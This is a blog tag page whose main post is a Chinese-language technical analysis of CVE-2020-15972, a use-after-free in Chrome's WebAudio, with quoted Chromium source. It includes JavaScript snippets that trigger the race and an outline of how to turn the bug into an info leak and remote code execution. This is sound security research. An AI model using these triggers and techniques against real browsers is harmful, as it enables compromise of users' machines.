<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: webaudio - buffer0verflooow - Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="buffer0verflooow - Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="buffer0verflooow - Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="buffer0verflooow - Blog"><meta property="og:url" content="https://buffer0verflooow.github.io/"><meta property="og:site_name" content="buffer0verflooow - Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://buffer0verflooow.github.io/img/og_image.png"><meta property="article:author" content="buffer0verflooow"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://buffer0verflooow.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://buffer0verflooow.github.io"},"headline":"buffer0verflooow - Blog","image":["https://buffer0verflooow.github.io/img/og_image.png"],"author":{"@type":"Person","name":"buffer0verflooow"},"publisher":{"@type":"Organization","name":"buffer0verflooow - Blog","logo":{"@type":"ImageObject","url":"https://buffer0verflooow.github.io/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">webaudio</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-06T13:00:55.000Z" title="2021/12/6 21:00:55">2021-12-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-12-06T13:09:54.119Z" title="2021/12/6 21:09:54">2021-12-06</time></span><span class="level-item">a few seconds read (About 4 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/06/Chrome-CVE-2020-6449-UAF/">Chrome CVE-2020-6449 UAF</a></p><div class="content"><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-02T10:58:56.000Z" title="2021/12/2 18:58:56">2021-12-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-12-12T09:51:28.740Z" title="2021/12/12 17:51:28">2021-12-12</time></span><span class="level-item">an hour read (About 7267 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/02/CVE-2020-15972-Chrome%E6%B5%8F%E8%A7%88%E5%99%A8RCE/">CVE-2020-15972 Chrome浏览器RCE</a></p><div class="content"><p>漏洞原因</p>
<p>Chrome 的 WebAudio 组件中的UAF</p>
<p>影响范围</p>
<p>该错误已在 10 月份的 Chrome <a target="_blank" rel="noopener" href="https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop.html">86.0.4240.75</a>版中<a target="_blank" rel="noopener" href="https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop.html">修复</a>。影响了 Chrome 85 稳定版的大部分。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/">https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/</a></p>
</blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>以前，网页对于音频的处理仅限于<code>&lt;audio&gt;</code>标签，能力十分有限，为了实现更高级的操作，W3C设计实现了WebAudio API，通过这些API，我们几乎可以完成一个专业的音频处理软件的构建。</p>
<p>WebAudio API可以实现：</p>
<ul>
<li>实现高精度的音频计算。</li>
<li>音频混响器。</li>
<li>3D音频。</li>
<li>与<code>&lt;audio&gt;/WebRTC</code>的集成。</li>
</ul>
<p>设计思路：类似于标准IO函数，从某个地方（input）读取一个音频流，经过实时计算处理后发送去某个地方（destination），这个处理过程是effect。</p>
<p><img src="https://mdn.mozillademos.org/files/12241/webaudioAPI_en.svg"></p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>由于音频处理是一项计算密集型任务，它将在单独的音频线程上完成，以便不阻塞浏览器的响应。WebAudio中的音频输入以128帧为单位进行处理，称为quantum。一旦一个quantum开始处理，整个quantum就必须完成，这意味着所有的节点都必须处理这128帧，即使有些节点被主线程删除和收集垃圾。</p>
<p>在下面的情况中，convolver实际上不会被删除，因为每个节点都持有对它所连接的输出节点的引用。然而，如果我们断开节点的连接，则convolver可能会被删除，但音频图仍然在被处理。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> soundSource1 = audioContext.<span class="title function_">createConstantSource</span>();</span><br><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line">soundSource1.<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br><span class="line">audioContext.<span class="title function_">startRendering</span>();       <span class="comment">//&lt;-------- start processing the audio graph</span></span><br><span class="line">soundSource1.<span class="title function_">disconnect</span>();</span><br><span class="line">convolver = <span class="literal">null</span>;</span><br><span class="line"><span class="title function_">gc</span>();</span><br></pre></td></tr></table></figure>

<p>那么一个死去的节点如何继续处理音频数据呢？在WebAudio中，AudioNode实际上只是javascript的一个接口，实际的处理是由它拥有的AudioHandler处理的。当一个AudioNode被销毁时，它将使用IsPullingAudioGraph函数检查此刻是否正在处理一个quantum。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNode::Dispose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK</span>(<span class="built_in">IsMainThread</span>());</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG_AUDIONODE_REFERENCES</span></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;[%16p]: %16p: %2d: AudioNode::dispose %16p @%g\n&quot;</span>, <span class="built_in">context</span>(),</span><br><span class="line">          <span class="keyword">this</span>, <span class="built_in">Handler</span>().<span class="built_in">GetNodeType</span>(), handler_.<span class="built_in">get</span>(),</span><br><span class="line">          <span class="built_in">context</span>()-&gt;<span class="built_in">currentTime</span>());</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="function">BaseAudioContext::GraphAutoLocker <span class="title">locker</span><span class="params">(context())</span></span>;</span><br><span class="line">  <span class="built_in">Handler</span>().<span class="built_in">Dispose</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果上下文被拉到音频图上，就把处理程序添加到孤儿列表中。 </span></span><br><span class="line">  <span class="comment">// 这将使处理程序保持运行，直到它可以在一个安全点（在处理程序任务的前/后）被删除。 </span></span><br><span class="line">  <span class="comment">// 如果图没有被拉动，我们现在就可以删除处理程序，因为音频线程上没有任何东西会接触到它。</span></span><br><span class="line">  <span class="built_in">DCHECK</span>(<span class="built_in">context</span>());</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">context</span>()-&gt;<span class="built_in">IsPullingAudioGraph</span>()) &#123;</span><br><span class="line">    <span class="built_in">context</span>()-&gt;<span class="built_in">GetDeferredTaskHandler</span>().<span class="built_in">AddRenderingOrphanHandler</span>(</span><br><span class="line">        std::<span class="built_in">move</span>(handler_));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Notify the inspector that this node is going away. The actual clean up</span></span><br><span class="line">  <span class="comment">// will be done in the subclass implementation.</span></span><br><span class="line">  <span class="built_in">ReportWillBeDestroyed</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果一个quantum正在被处理，它将把AudioHandler（handler_）的所有权转移到由AudioContext本身拥有的<code>deferred_task_handler_</code>。然后DeferredTaskHandler将确保AudioHandler保持运行，直到quantum的处理完成，然后清理孤儿AudioHandler。</p>
<p>然而，有一个例外。如果包含音频图的javascript框架被破坏了，例如，当包含图的iframe被破坏时，那么DeferredTaskHandler将在quantum仍在处理时立即进行清理，调用ClearHandlersToBeDeleted函数，这将删除孤儿AudioHandler（之前有一个信号量可以解决这个问题，但该信号量在这次<a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/e4c27b508976fb751ccd4d34e52b70b668618271?originalUrl=https//////:////////cs.chromium.org/">commit</a>中被删除了）。</p>
<h2 id="控制竞争"><a href="#控制竞争" class="headerlink" title="控制竞争"></a>控制竞争</h2><p>为了在竞争获取足够的时间，来操作AudioHandler，exp使用了<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/AudioWorkletNode"><code>AudioWorkletNode</code></a>，AudioWorkletNode允许节点运行用户自定义的JavaScript代码，具体如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> audioContext.<span class="property">audioWorklet</span>.<span class="title function_">addModule</span>(<span class="string">&#x27;tear-down.js&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> worklet;</span><br><span class="line">worklet = <span class="keyword">new</span> <span class="title class_">AudioWorkletNode</span>(audioContext, <span class="string">&#x27;tear-down&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br></pre></td></tr></table></figure>

<p>可以在tear-down.js中使用sleep函数，这样就有足够的时间删除和替换ConvolverNode：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AutoProcessor</span> <span class="keyword">extends</span> <span class="title class_ inherited__">AudioWorkletProcessor</span> &#123;</span><br><span class="line">  <span class="title function_">process</span> (inputs, outputs, parameters) &#123;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>删除ConvolverNode的例子如下（实际上，convolver需要运行在另一个不调用parent.removeFrame的函数的范围之内，这里只是举个例子）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> audioContext.<span class="property">audioWorklet</span>.<span class="title function_">addModule</span>(<span class="string">&#x27;tear-down.js&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> worklet = <span class="keyword">new</span> <span class="title class_">AudioWorkletNode</span>(audioContext, <span class="string">&#x27;tear-down&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br><span class="line">audioContext.<span class="title function_">startRendering</span>();</span><br><span class="line"><span class="title function_">sleep</span>(<span class="number">200</span>);</span><br><span class="line">worklet.<span class="title function_">disconnect</span>();</span><br><span class="line">convolver = <span class="literal">null</span>;</span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line">parent.<span class="title function_">removeFrame</span>(); <span class="comment">//&lt;-------- Get parent frame to delete outselves;</span></span><br></pre></td></tr></table></figure>

<p>另一个有用的事实是，在这样做的时候，只有与所有输入断开连接的节点才会被删除，而与输入保持连接的节点即使在iframe被删除后也会保持活力，只有在处理完成后才会被删除。如下所示，当worklet完成处理时，convolver将保持运行直到gain结束为止：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line"><span class="keyword">let</span> gain = audioContext.<span class="title function_">createGain</span>();</span><br><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(gain).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br><span class="line">audioContext.<span class="title function_">startRendering</span>();</span><br><span class="line"><span class="title function_">sleep</span>(<span class="number">200</span>);</span><br><span class="line">convolver.<span class="title function_">disconnect</span>();</span><br><span class="line">gain = <span class="literal">null</span>;</span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line">parent.<span class="title function_">removeFrame</span>(); <span class="comment">//&lt;-------- Get parent frame to delete outselves;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞原语"><a href="#漏洞原语" class="headerlink" title="漏洞原语"></a>漏洞原语</h2><p>每个AudioHandler拥有一个音频节点的输入和输出的列表。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MODULES_EXPORT</span> <span class="title class_">AudioHandler</span> : public <span class="title class_">ThreadSafeRefCounted</span>&lt;<span class="title class_">AudioHandler</span>&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="title class_">Vector</span>&lt;<span class="attr">std</span>::unique_ptr&lt;<span class="title class_">AudioNodeInput</span>&gt;&gt; inputs_;</span><br><span class="line">  <span class="title class_">Vector</span>&lt;<span class="attr">std</span>::unique_ptr&lt;<span class="title class_">AudioNodeOutput</span>&gt;&gt; outputs_;</span><br></pre></td></tr></table></figure>

<p>AudioNodeInput（AudioSummingJunction的一个子类）也持有一个连接到它的输出列表：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AudioSummingJunction</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// m_renderingOutputs is a copy of m_outputs which will never be modified</span></span><br><span class="line">  <span class="comment">// during the graph rendering on the audio thread.  This is the list which</span></span><br><span class="line">  <span class="comment">// is used by the rendering code.</span></span><br><span class="line">  <span class="comment">// Whenever m_outputs is modified, the context is told so it can later</span></span><br><span class="line">  <span class="comment">// update m_renderingOutputs from m_outputs at a safe time.  Most of the</span></span><br><span class="line">  <span class="comment">// time, m_renderingOutputs is identical to m_outputs.</span></span><br><span class="line">  <span class="comment">// These raw pointers are safe. Owner of this AudioSummingJunction has</span></span><br><span class="line">  <span class="comment">// strong references to owners of these AudioNodeOutput.</span></span><br><span class="line">  <span class="title class_">Vector</span>&lt;<span class="title class_">AudioNodeOutput</span>*&gt; rendering_outputs_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>AudioNodeOutput保留了一个与它相连的AudioNodeInput的列表：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MODULES_EXPORT</span> <span class="title class_">AudioNodeOutput</span> final &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// This HashSet holds connection references. We must call</span></span><br><span class="line">  <span class="comment">// AudioNode::makeConnection when we add an AudioNodeInput to this, and must</span></span><br><span class="line">  <span class="comment">// call AudioNode::breakConnection() when we remove an AudioNodeInput from</span></span><br><span class="line">  <span class="comment">// this.</span></span><br><span class="line">  <span class="title class_">HashSet</span>&lt;<span class="title class_">AudioNodeInput</span>*&gt; inputs_;</span><br></pre></td></tr></table></figure>

<p>在下面的例子中，ConvolverHandler拥有一个AudioNodeInput和一个AudioNodeOutput，AudioNodeInput持有对worklet的AudioNodeOutput的引用，而AudioNodeOutput持有对gain的AudioNodeInput的引用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soundSource.<span class="title function_">connect</span>(worklet).<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(gain).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br></pre></td></tr></table></figure>

<p>当处理一个音频图时，代码实际上是从目的地开始向后传播，并调用AudioNodeInput::Pull，然后它将为每个连接到它的输出调用AudioNodeOutput::Pull。然后AudioNodeOutput::Pull调用拥有它的AudioHandler::ProcessIfNecessary，后者又会为它的输入调用AudioNodeInput::Pull，并将调用传播给连接到它的AudioHandler。这一直持续到没有输入的源节点，然后实际的处理将从调用AudioHandler::Process开始。在AudioHandler::Process完成后，它将通过AudioNodeOutput::Pull-&gt;AudioNodeInput::Pull-&gt;AudioHandler::PullInputs-&gt;AudioHandler::ProcessIfNecessary返回到下一个AudioHandler的AudioHandler::Process。下图以两个AudioHandler为例说明了这一点，下面的一个是AudioWorkletNode：</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/graph_pull.png"></p>
<p>在上图中，每个大的矩形代表了对AudioHandler所拥有的对象的所有调用，里面的小矩形代表了被调用的函数。蓝色箭头代表控制流边缘，从一个AudioHandler跳到另一个。当用一个等待了很长时间的AudioWorkletHandler来触发UAF时，相关的跳转是在AudioHandler::Process完成之后，因为在那个时候，下一个AudioHandler会被删除和替换。在上图中，红色区域表示用对象进行的调用，这些对象在调用时将被删除。此时，代码将首先返回AudioWorkletHandler拥有的AudioNodeOutput::Pull，就在对ProcessIfNecessary的调用之后。下面是它随后将遵循的代码路径，以及一些利用的可能性。</p>
<ol>
<li>当Process返回时，它首先会返回到AudioWorkletHandler的ProcessIfNecessary，然后是它所拥有的AudioNodeOutput::Pull。这时，这些对象都不会被删除（对应于图中左下角灰色框中AudioHandler::Process之后的蓝色箭头部分）。如果AudioNodeOutput::Pull是从AudioNodeInput::Pull，而不是AudioNodeInput::SumAllConnections中调用的，那么它将跳回到已释放的 AudioHandler::PullInputs，这意味着inputs_将在循环仍在迭代时被删除。</li>
<li>如果上面的inputs_的大小是一个开始，那么循环就会直接退出，而ProcessIfNecessary将从PullInputs之后继续。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioHandler::ProcessIfNecessary</span><span class="params">(<span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">PullInputs</span>(frames_to_process);</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">bool</span> silent_inputs = <span class="built_in">InputsAreSilent</span>();</span><br><span class="line">    <span class="keyword">if</span> (silent_inputs &amp;&amp; <span class="built_in">PropagatesSilence</span>()) &#123;</span><br><span class="line">      <span class="built_in">SilenceOutputs</span>();</span><br><span class="line">      <span class="built_in">ProcessOnlyAudioParams</span>(frames_to_process);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">UnsilenceOutputs</span>();</span><br><span class="line">      <span class="built_in">Process</span>(frames_to_process);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这时，AudioHandler已经被释放了。根据InputsAreSilent的结果，虚函数PropagatesSilence或Process将被调用。</p>
<ol start="3">
<li>如果上一点中被删除的AudioHandler被另一个有效的AudioHandler替换了，这样虚拟函数的调用就不会崩溃，那么ProcessIfNecessary将返回到调用AudioNodeOutput::Pull。现在因为AudioNodeOutput和AudioHandler的大小不同，所以有可能AudioNodeOutput（在调用AudioNodeOutput::Pull）仍然被释放的情况下替换AudioHandler（堆栈&#x2F;注册表仍然存储指向被释放对象的指针，而不是替换后的AudioHandler的AudioNodeOutput）。然后，AudioNodeOutput::Pull函数将调用Bus并返回一个指向该AudioNodeOutput拥有的AudioBus对象的指针。这意味着返回值也将被释放，指向的对象（AudioBus）可以被替换成受控数据。然而，这只在从AudioNodeInput::SumAllConnections调用AudioNodeOutput::Pull的路径中才有意义，因为通过AudioNodeInput::Pull的路径并不利用返回值。</li>
</ol>
<p>虽然第二点可以通过伪造vtable来劫持控制流，但这需要有信息泄露来打败ASLR，并获得一个堆地址来存储假vtable，所以在这一点上我无法使用它。第一点有可能是非常强大的，因为它有可能让我用任何类型的指针向量来替换inputs_，导致AudioNodeInput和许多可能的类型之间的类型混淆。可以用一个简单的CodeQL查询来找到可能的类型。</p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="可选"><a href="#可选" class="headerlink" title="可选"></a>可选</h3><p>先看第三种可能，当通过SumAllConnections调用时，输出的返回值output，现在已经被释放了，被传递给SumFrom。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNodeInput::SumAllConnections</span><span class="params">(scoped_refptr&lt;AudioBus&gt; summing_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="built_in">NumberOfRenderingConnections</span>(); ++i) &#123;</span><br><span class="line">    ...</span><br><span class="line">    AudioBus* connection_bus = output-&gt;<span class="built_in">Pull</span>(<span class="literal">nullptr</span>, frames_to_process);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sum, with unity-gain.</span></span><br><span class="line">    summing_bus-&gt;<span class="built_in">SumFrom</span>(*connection_bus, interpretation);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据summing_bus和connection_bus之间的通道数量，可以采取各种路径。最简单的路径只是调用AudioChannel::SumFrom</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioBus::SumFrom</span><span class="params">(<span class="type">const</span> AudioBus&amp; source_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">                       ChannelInterpretation channel_interpretation)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (number_of_source_channels == number_of_destination_channels) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; number_of_source_channels; ++i)</span><br><span class="line">      <span class="built_in">Channel</span>(i)-&gt;<span class="built_in">SumFrom</span>(source_bus.<span class="built_in">Channel</span>(i));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>AudioChannel::SumFrom简单地将source_bus, (connection_bus)中的数据复制到summing_bus，使用summing_bus的长度。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioChannel::SumFrom</span><span class="params">(<span class="type">const</span> AudioChannel* source_channel)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsSilent</span>()) &#123;</span><br><span class="line">    <span class="built_in">CopyFrom</span>(source_channel);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//Copies using the length of `summing_bus` (`length()`)</span></span><br><span class="line">    vector_math::<span class="built_in">Vadd</span>(<span class="built_in">Data</span>(), <span class="number">1</span>, source_channel-&gt;<span class="built_in">Data</span>(), <span class="number">1</span>, <span class="built_in">MutableData</span>(), <span class="number">1</span>,</span><br><span class="line">                      <span class="built_in">length</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，如果可以用一个长度短于summing_bus的Bus来替换已释放的AudioNodeOutput，那么就可以得到一个越界的读取。通过安排堆，就可以利用这一点获得一个vtable和&#x2F;或堆指针的地址，这将能够使用第二点中的虚拟函数调用原语来实现远程代码执行。</p>
